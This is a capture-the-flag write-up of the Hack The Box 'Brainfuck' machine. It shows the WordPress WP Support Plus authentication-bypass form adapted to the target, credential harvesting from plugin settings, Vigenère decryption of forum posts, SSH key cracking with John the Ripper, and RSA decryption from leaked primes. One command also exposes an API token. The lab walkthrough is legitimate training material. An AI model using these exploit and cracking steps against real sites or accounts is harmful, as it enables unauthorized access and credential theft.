---
permalink: /posts/HTB/Brainfuck
title:  "HTB Brainfuck"
author: Luc Kolen
description: "Brainfuck is an insane Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Insane
  - Linux
  - Wordpress
  - SMTP
  - Vigenère Cipher
  - RSA
---
# 10.10.10.17 - Brainfuck

- [10.10.10.17 - Brainfuck](#10101017---brainfuck)
  - [Open ports](#open-ports)
  - [SSL/http](#sslhttp)
    - [brainfuck.htb](#brainfuckhtb)
    - [sup3rs3cr3t.brainfuck.htb](#sup3rs3cr3tbrainfuckhtb)
  - [Cracking the id_rsa file](#cracking-the-id_rsa-file)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/Brainfuck$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.17
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
25/tcp|smtp|Postfix smtpd
110/tcp|pop3|Dovecot pop3d
143/tcp|imap|Dovecot imapd
443/tcp|ssl/http|nginx 1.10.0 (Ubuntu)

## SSL/http

Opening `https://10.10.10.17/` shows the default `nginx` page, but the certificate does leak the hostnames `brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb`.

```bash
luc@kali:~/HTB/Brainfuck$ sudo nano /etc/hosts
...
10.10.10.17     brainfuck.htb
10.10.10.17     sup3rs3cr3t.brainfuck.htb
```

### brainfuck.htb

With `brainfuck.htb` added to `/etc/hosts` we can now open `https://brainfuck.htb/` which shows a website.
This page shows the email address `orestis@brainfuck.htb`.
The subtitle is `Just another WordPress site` so we'll use `wpscan` to find vulnerabilities.

```bash
luc@kali:~/HTB/Brainfuck$ wpscan --url https://brainfuck.htb --disable-tls-checks
...
[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
```

We need to register an account to get the full output.

```bash
luc@kali:~/HTB/Brainfuck$ wpscan --url https://brainfuck.htb --disable-tls-checks --api-token ********
...
[+] wp-support-plus-responsive-ticket-system
Version: 7.1.3 (100% confidence)
...
```

We get a lot more vulnerabilities now, but nothing that would give us access to the machine (if we filter by exploits known at time of the machine coming out). What we do see is that `WP Support Plus Responsive Ticket System 7.1.3` is used.

```bash
luc@kali:~/HTB/Brainfuck$ searchsploit wp support 7.1.3
...
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation | php/webapps/41006.txt
...
```

[41006](https://www.exploit-db.com/exploits/41006) notes that we can login as anyone without knowing the password and it also includes a proof of concept

```html
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

We only need the username so we can rerun `wpscan`, but with `--enumerate u` to also enumerate users.

```bash
luc@kali:~/HTB/Brainfuck$ wpscan --url https://brainfuck.htb --disable-tls-checks --api-token 1tOuZjR3zQ0xOtaZUQhD7dbsLIcrqOK3Gr1NYpNxKaw --enumerate u
...
[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
...
```

We've 2 users, `admin` & `administrator`, now we can edit the proof of concept and make it work for this machine.

```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

Browsing to this html in our browser and submitting the form will send the following request

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: brainfuck.htb

username=admin&email=sth&action=loginGuestFacebook
```

If we log the response in Burp Suite we'll see that the response is an empty page, but that cookie values are being set. With those cookies set we're logged in as admin when we browse back to `https://brainfuck.htb/`.

There is one post on this Wordpress website and it notes that the SMTP integration is ready. This means that this has recently been setup so if we find credentials they have a high chance of working because there has been less time in which a user has changed those credentials.

Dashboard -> Settings -> Easy WP SMTP shows the SMTP settings including a password field. This input field has `type=password`, but we can still ready the value via the Chrome developer tools. We know have our first set of credentials, `orestis@brainfuck.htb` with password `kHGuERB29DNiNE`.

We've 2 emails, one from root@brainfuck.htb and one from wordpress@brainfuck.htb. The one from wordpress@brainfuck.htb doesn't contain any information, but the one from root@brainfuck.htb is interesting.

```text
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```

We've already identified what the `"secret" forum` is by our previous SSL certificate check, `sup3rs3cr3t.brainfuck.htb`.

### sup3rs3cr3t.brainfuck.htb

With `sup3rs3cr3t.brainfuck.htb` added to `/etc/hosts` we can now open `https://sup3rs3cr3t.brainfuck.htb/` which shows a forum website. There is only one public post on this forum and it shows 2 users, `admin` and `orestis`.

We can try the credentials we found in the email, username `orestis` and password `kIEnnfEKJ#9UmdO`.

Loggin in with these credentials gives access to 2 new discussions on the forum.

```text
SSH Access

admin
SSH Access was upgraded to make use of keys. Password login is permanently disabled.

orestis
Go fuck yourself admin, I am locked out!! send me my key asap!

Orestis - Hacking for fun and profit

admin
You little shit, still no manners I see... You want me to paste it here for all members to download?

orestis
I am opening up an encrypted thread. Talk to you there!

Orestis - Hacking for fun and profit
```

```text
Key

orestis
Mya qutf de buj otv rms dy srd vkdof :)

Pieagnm - Jkoijeg nbw zwx mle grwsnn

admin
Xua zxcbje iai c leer nzgpg ii uy...

orestis
Ufgoqcbje....

Wejmvse - Fbtkqal zqb rso rnl cwihsf

admin
Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg :)

mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr

orestis
Si rbazmvm, Q'yq vtefc gfrkr nn ;)

Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
```

We can see that the first discussion between admin and orestis is about disabling password access to SSH and only allowing key access. This was also shown in the NMAP results. The second chat is encrypted, but we can make a few assumptions about what the output should look like.

- All messages are encrypted with the same key
- Orestis ends every message with `Orestis - Hacking for fun and profit`
- `mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr` is probably an URL
  - `mnvze://` is probably `https://`
  - 10.10.10.17 is the ip of the machine so numbers aren't impacted
  - `sp_ptr` could be `id_rsa`, an often used filename for SSH keys

This shows that it's probably a Vigenère Cipher and we can use this website [boxentriq](https://www.boxentriq.com/code-breaking/vigenere-cipher) to crack it.

![Boxentriq result](/assets/images/HTB-Brainfuck/1.a%20Boxentriq%20result.png)

We only input the characters `[A-Za-z]` because we identified that only those are changed by the algorithm.

- Input: `wejmvsefbtkqalzqbrsornlcwihsf`
- Output: `orestishackingforfunandprofit`
- Key: `infuckmybrainfuckmybrainfuckm`

The key is `fuckmybrain` which keeps repeating for as long the message is.

We can now use this website to decrypt the messages by having them as the input and `fuckmybrain` as the key.

- Input: `Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg :) mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr`
- Key: `fuckmybrain`
- Output: `There you go you stupid fuck, I hope you remember your key password because I dont :) https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa`

We can see that all the assumptions we made at the start came true and we can now download the `id_rsa` file.

```bash
luc@kali:~/HTB/Brainfuck$ wget https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
```

## Cracking the id_rsa file

We can try loggin in by using the `id_rsa` file.

```bash
luc@kali:~/HTB/Brainfuck$ ssh orestis@10.10.10.17 -i id_rsa
load pubkey "id_rsa": invalid format
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
orestis@10.10.10.17: Permission denied (publickey).
luc@kali:~/HTB/Brainfuck$ chmod 600 id_rsa
luc@kali:~/HTB/Brainfuck$ ssh orestis@10.10.10.17 -i id_rsa
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa':
orestis@10.10.10.17: Permission denied (publickey).
```

We'll need to crack this `id_rsa` file.

```bash
luc@kali:~/HTB/Brainfuck$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.john
luc@kali:~/HTB/Brainfuck$ john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2020-06-17 01:56) 0.3952g/s 5668Kp/s 5668Kc/s 5668KC/sa6_123..*7¡Vamos!
Session completed
```

`3poulakia!` is the password for the `id_rsa` file, we can now finally login via SSH.

```bash
luc@kali:~/HTB/Brainfuck$ ssh orestis@10.10.10.17 -i id_rsa
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

You have mail.
Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
orestis@brainfuck:~$ cat user.txt
2c11cfbc************************
```

## Privilege escalation

We can now explore the machine as orestis, first we'll check the home directory.

```bash
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
```

```text
# debug.txt

7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

```python
# encrypt.sage

nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

```text
# output.txt

Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

We can see that the debug.txt file contains the `p`, `q` and `e` used in the RSA encryption. Online we can find [this script](https://gist.github.com/intrd/3f6e8f02e16faa54729b9288a8f59582) that will use these values to decrypt the value, `ct`.

```python
#!/usr/bin/python
## RSA - Given p,q and e.. recover and use private key w/ Extended Euclidean Algorithm - crypto150-what_is_this_encryption @ alexctf 2017
# @author intrd - http://dann.com.br/ (original script here: http://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

import binascii, base64

p = 0xa6055ec186de51800ddd6fcbf0192384ff42d707a55f57af4fcfb0d1dc7bd97055e8275cd4b78ec63c5d592f567c66393a061324aa2e6a8d8fc2a910cbee1ed9
q = 0xfa0f9463ea0a93b929c099320d31c277e0b0dbc65b189ed76124f5a1218f5d91fd0102a4c8de11f28be5e4d0ae91ab319f4537e97ed74bc663e972a4a9119307
e = 0x6d1fdab4ce3217b3fc32c9ed480a31d067fd57d93a9ab52b472dc393ab7852fbcb11abbebfd6aaae8032db1316dc22d3f7c3d631e24df13ef23d3b381a1c3e04abcc745d402ee3a031ac2718fae63b240837b4f657f29ca4702da9af22a3a019d68904a969ddb01bcf941df70af042f4fae5cbeb9c2151b324f387e525094c41
ct = 0x7fe1a4f743675d1987d25d38111fae0f78bbea6852cba5beda47db76d119a3efe24cb04b9449f53becd43b0b46e269826a983f832abb53b7a7e24a43ad15378344ed5c20f51e268186d24c76050c1e73647523bd5f91d9b6ad3e86bbf9126588b1dee21e6997372e36c3e74284734748891829665086e0dc523ed23c386bb520

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

n = p*q #product of primes
phi = (p-1)*(q-1) #modular multiplicative inverse
gcd, a, b = egcd(e, phi) #calling extended euclidean algorithm
d = a #a is decryption key

out = hex(d)
print("d_hex: " + str(out));
print("n_dec: " + str(d));

pt = pow(ct, d, n)
print("pt_dec: " + str(pt))

out = hex(pt)
out = str(out[2:-1])
print "flag"
print out.decode("hex")
```

```bash
luc@kali:~/HTB/Brainfuck$ nano decrypt.py
...
p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
...
luc@kali:~/HTB/Brainfuck$ python decrypt.py
d_hex: 0xc6eccf2d2584044e2173cf0efa88f839ee184df56ce3e6aa450cfcdf9e5ec8b4d8123c2cd57ee4bf7c84e423941191ec57a7944e31327a722143edc1981ecf24bd9b389d673a1bd44288103e501f46994b700ac1abcb15339ff0750566957064605eb9205d159360fb6b907b39ee98683b0f6f418619fcb1665c4c7fa7984e9L
n_dec: 8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt_dec: 24604052029401386049980296953784287079059245867880966944246662849341507003750
flag
6efc1a5d************************
```

## TL;DR

- SSL cert shows 2 domainnames
- Exploit in Wordpress allows for account login
- SMTP credentials in Wordpress settings
- Forum credentials in email account
- Encrypted forum messages show path to id_rsa file
- Crack id_rsa file to login as user via SSH
- Crack RSA with known `p`, `q` & `e`
